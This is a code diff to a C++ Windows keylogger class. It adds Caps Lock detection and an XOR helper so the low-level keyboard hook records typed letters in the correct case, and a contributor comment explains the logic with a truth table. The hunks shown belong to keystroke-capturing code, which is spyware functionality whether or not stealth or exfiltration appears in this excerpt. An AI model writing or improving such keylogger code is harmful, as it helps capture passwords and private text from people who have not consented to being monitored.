@@ -27,6 +27,21 @@ KeyLogger::KeyLogger(LogTypeName newLogType)
      objPointer = this;
 }
 
+bool KeyLogger::isCapsLock()
+{
+     if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0)
+        return true;
+     else
+        return false;    
+}
+
+bool KeyLogger::logicalXOR(bool p, bool q)
+{
+     /* since there is no operator for logical xor in c++
+        it must be written in once of the equivelant forms */
+     return ((p || q) && !(p && q));
+}
+
 void KeyLogger::hookIt(void)
 {
      // Retrieve the applications instance
@@ -52,7 +67,6 @@ LRESULT CALLBACK KeyLogger::LowLevelKeyboardProc( int nCode, WPARAM wParam, LPAR
 {
     // Declare pointer to the KBDLLHOOKSTRUCT
     KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
-
 
     switch (wParam)
     {
@@ -108,9 +122,30 @@ LRESULT CALLBACK KeyLogger::LowLevelKeyboardProc( int nCode, WPARAM wParam, LPAR
         }
         else if ((vkCode>64)&&(vkCode<91)) // Keys a-z
         {
-            if (!GetAsyncKeyState(VK_SHIFT)) // If the shift key is not down, un-capitalize letters
+            /*
+            The following is a complicated statement to check if the letters need to be switched to lowercase.
+            Here is an explanation of why the exclusive or (XOR) must be used.
+            
+            Shift   Caps    LowerCase    UpperCase
+            T       T       T            F
+            T       F       F            T
+            F       T       F            T
+            F       F       T            F
+            
+            The above truth table shows what case letters are typed in,
+            based on the state of the shift and caps lock key combinations.
+            
+            The UpperCase column is the same result as a logical XOR.
+            However, since we're checking the opposite in the following if statement, we'll also include a NOT operator (!)
+            Becuase, NOT(XOR) would give us the LowerCase column results.
+            
+            There's your lesson in logic if you didn't understand the next statement. Hopefully that helped.
+            
+            --Dan
+            */
+            if (!(logicalXOR(GetAsyncKeyState(VK_SHIFT),isCapsLock()))) // Check if letters should be lowercase
             {
-                vkCode+=32;
+                vkCode+=32; // Un-capitalize letters
             }
             char val[5];
             sprintf(val,"%c",vkCode);
